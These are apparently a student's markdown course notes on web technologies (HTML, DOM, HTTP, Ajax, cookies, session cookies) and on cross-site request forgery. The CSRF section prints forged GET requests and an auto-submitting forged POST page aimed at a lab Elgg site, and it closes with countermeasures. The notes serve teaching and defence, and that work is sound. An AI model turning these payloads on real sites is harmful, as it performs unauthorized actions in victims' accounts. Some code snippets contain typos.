# Week 5 The Web Technologies and Cross-Site Request Forgery Attack
## Directory
- [Home](/README.md#table-of-contents)
- [Week 4 Format String Attack and Shellshot Attack](/week4/README.md#week-4-format-string-attack-and-shellshock-attack)
- **&rarr;[Week 5 The Web Technologies and Cross-Site Request Forgery Attack](/week5/README.md#week-5-the-web-technologies-and-cross-site-request-forgery-attack)**
- [Week 6 Cross-Site Scripting Attack](/week6/README.md#week-6-cross-site-scripting-attack)


## 5.2 Part 1: The Web Technologies
([top](#directory))

## 5.3 The Web Architecture
([top](#directory))

- Web Browser
  - display pages
  - send `get.php`

- &darr;`http request`&uarr;`http response`

- Web Server
  - apache
  - static content (file)
  - Web Application Server
    - cgi/php
    - run `get.php`
- &darr;`sql`&uarr;
- Database

### Browser Side

- Browser
  - static content
  - dynamic content
    - flash (lol)
      - replaced by HTML5
      - browsers stopped supporting
    - **JavaScript&larr;**
    - silverlight (lol)
    - active x

### HTML and DOM

```html
<html>
<head>
  <title>My Title</title>
</head>
<body>
  <h1>My header</h1>
  <a href="">my link</a>
</body>
</html>
```
- DOM
  - Document Object Model
  - represents code as a tree
- DOM APIs
  - `document.getElementById("id")`

### JavaScript

```HTML
<!DOCTYPE html>
<html>
    <body>
        <h1>my first javasript</h1>

        <button type="button" onclick="myFunction()">Date</button>
        <p id="demp"></p>
    </body>
    <script>
        function myFunction(){
            document.getElementById("demo").innerHTML=Date();
        }
    </script>
</html>

```

### CSS Cascading Style Sheets

- past 
  - data + presentation mixed
- modern
  - data || presentation

## 5.4 HTTP Requests
([top](#directory))
- LiveHTTPHeader

### HTTP GET/POST Methods

#### HTTP GET method
```http
GET /test/demo_get.php?name1=value&name2=value2 HTTP/1.1
Host: www.example.com
```

#### HTTP POST method
```http
POST /test/demo_post.php HTTP/1.1
Host: www.example.com

name1=value1&name2=value2
```

- form
  - name1: [value 1]
  - name2: [value 2]
  - submit

#### HTTPS
- communication between browser and server is encrypted

##### HTTP
- HTTP
  - TCP

##### HTTPS
- HTTP
  - SSL (encryption)
  - TCP

## 5.5 Ajax
([top](#directory))

### Ajax Request
- we don't want to replace the whole page, just part of the page

- previous
  - server response with entire page to replace browser page
- ajax
  - browser request to server
  - result encoded
    - xml, json
  - javascript triggered to update part of DOM

```html

<script type="javascript">
    // asynchronous!
    function sendAjaxRequest(){
        var xhr= new XMLHttpRequest();
        xhr.open('GET','time.php', true);
        xhr.onreadystatechange=function()
        {
            if(xhr.readyState===4){
                document.myform.time.value=xhr.responseText;
            }
        }
        xhr.send(null);
    }
</script>
<form name="myform">
Input: <input type="text" name="input" onkeyup="sendAjaxRequest();"/>
Time: <input type="text" name="time"/>
</form>
```

## 5.6 Cookies
([top](#directory))

### The Stateless Nature of Web

- telnet to server
  - connection is always on until exit telnet
  - **stateful**

- page to server
  - connection is broken up
  - server doesn't dedicate a process to a browser session
  - stateless

### Cookies (yum)

- one possible solution
  - browser sends request
    - process/thread
      - save to disk/database
  - browser sends second request
    - prcoess/thread
      - go to disk/database where data is saved
- cookies
  - browser sends request
    - information sent back to browser via cookie
  - browser sends seconds request
    - send cookie with information

### Cookies in Action
```
GET /index.html HTTP/1.1
Host: www.example.org
```
browser &rarr; server
```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: name=value
Set-Cookie: name2=value2; Expires={datetime}

{content of page}
```
browser &larr; server
```
Get /spec.html HTTP/1.1
Host: www.example.org
Cookie: name=value; name2=value2
Accept: */*
```
browser &rarr; server

## 5.7 Web Tracking
([top](#directory))

### Web Tracking Using Third-Party Cookies
- Ad network
  - collects information about user
  - uses cookies

how?
- one pixel image inside of website sends request to ad server for
- ad server attaches cookie with **unique id** to response
  - ad network knows which page the request comes from
    - `refheader`
    - ad goes and views page and extracts data

## 5.8 Session Cookie
([top](#directory))

### Special Cookie: Session Cookies

- client
  - login
    - uid/password
- server

|browser||server|
|-|-|-|
|login|&rarr;||
||&larr;|session cookie (SID)|
|SID|&rarr;|check SID|

- sid 
  - user has been authenticated, no need to login
- server mantains the session data
  - pair with session data
- SID === userid/password

### Session Cookies

|browser||server|
|-|-|-|
|alice|sid&rarr;||
|bob|sid&rarr;||
|attacker|sid&rarr;||

- HTTP
  - traffic transmitted in plaintext
  - SID not protected
- HTTPS
  - SID protected

## 5.9 Summary
([top](#directory))

- HTML, JavaScript, DOM
- HTTP and HTTPS
- Ajax
- Cookies and Session Cookies

## 5.10 Part 2: CSRF Attack (Cross-Site Request Forgery)
([top](#directory))

### Cross-Site Request

- two websites, facebook and website
- send request from facebook to facebook server
  - same-site request
  - send session cookie with request
- send request from website to facebook server
  - cross-site request
  - broswer will attach the same cookie
- problem
  - is request from website or facebook?
  - does it matter?
  - **cross-site requests cannot be trusted**

- same-site request
  - trusted
- cross-site request
  - untrusted

### Cross-Site Request Forgery

- facebook
  - with session id can `addfriends:id`
- attacker
  - spoof `addfriends:id` with session id

## 5.11 Attack on GET Service
([top](#directory))


#### GET vs POST
```
GET /post_form.php?foo=hello&bar=world HTTP/1.1  <--data attached here!
Host: www.example.com
Cookie: SID=xsdfgergbghedvrbeadv

PSt /post_form.php HTTP/1.1
Host: www.example.com
Cookie: SID=xsdfgergbghedvrbeadv
Content-length: 19
foo=hello&bar=world
```

#### Target GET Service
```
http://www.example.com/transfer.php?to=3220&amount=500
```

#### Forge GET Request
```html
<img src="http://www.example.com/transfter.php?to=3220&amount=500">
<iframe src="http://www.example.com/transfter.php?to=3220&amount=500"></iframe>
```

### Attack GET Service
### Attack Page

```html
<html>
<body>
    <h1></h1>
    <img width=0 height=0 src="http://www.csrflabelgg.com/action/friends/add?friend=42">
</body>
</html>
```
Victim only needs to view the page

## 5.12 Attack on POST Service

### Edit-Profile POST Request

```
http://www.csrflabelgg.com/action/profile/edit

POST /action/profile/edit HTTP/1.1
Host: www.csrflabelgg.com
User-Agent: ...
Accept: ....
Accept-Language: ...
Referer: www.csrflabellgg.com/profile/samy/edit
Cookie: Elgg-mpasspvn1q67od11k19rkklema4
Content-Type: ...
Content-Length: ...
__elgg_token=1cc8v5c...&__elgg_ts=1489203659
&name=Sammy
&description=SAMMY+is+my+friend
&accesslevel%5Bdescrption%5D=2
...
&guid=42
```

### Attack POST Service
```html
<html><body>
<h1>This Page Forges and HTTP POST request</h1>
<script type="text/javascript">
    function forge_post(){
        let fields;
        fields +="<input type='hidden' name='name' value='Alice'>";
        fields +="<input type='hidden' name='description' value='Samy is my HERO'>";
        fields +="<input type='hidden' name='accesslevel[description]' value='2'>";
        fields +="<input type='hidden' name='guid' value='42'>";
        const p = document.createElement("form");
        p.action = "http://www.csrflabelgg.com/action/profile/edit";
        p.innerHTML = fields;
        p.method = "post";
        document.body.appendChild(p);
        p.sumbit();
    }
    window.onload = function(){forge_post();}
</script>
</body></html>
```


## 5.13 Countermeasures
([top](#directory))
- referer header
  - which page sent the request
  - often removed for privacy concerns
- place part of the cookie in the data
  - cross site doesn't know the cookie
- secret token
  - embed a secret token in your page and send with request

### Elgg (secret token)

#### inside page
```html
<input type="hidden" name="__elgg_ts" value=""/>
<input type="hidden" name="__elgg_token" value=""/>
```

#### request
```
http://www.csrflabelgg.com/actoin/friends/add?friend=42&__elgg_ts=141132342&__elgg_token=41242598798as98fas
```
#### inside server

### Same-Site Cookie Attribute

## 5.14 HTTPS and CSRF
([top](#directory))

SSL does not prevent CSRF because encryption is done by browser after the request is forged and sent.

## 5.15 Summary
([top](#directory))

- CSRF Attack
- Launch the CSRF attacks on GET and POST services
- Fundamental causes and countermeasures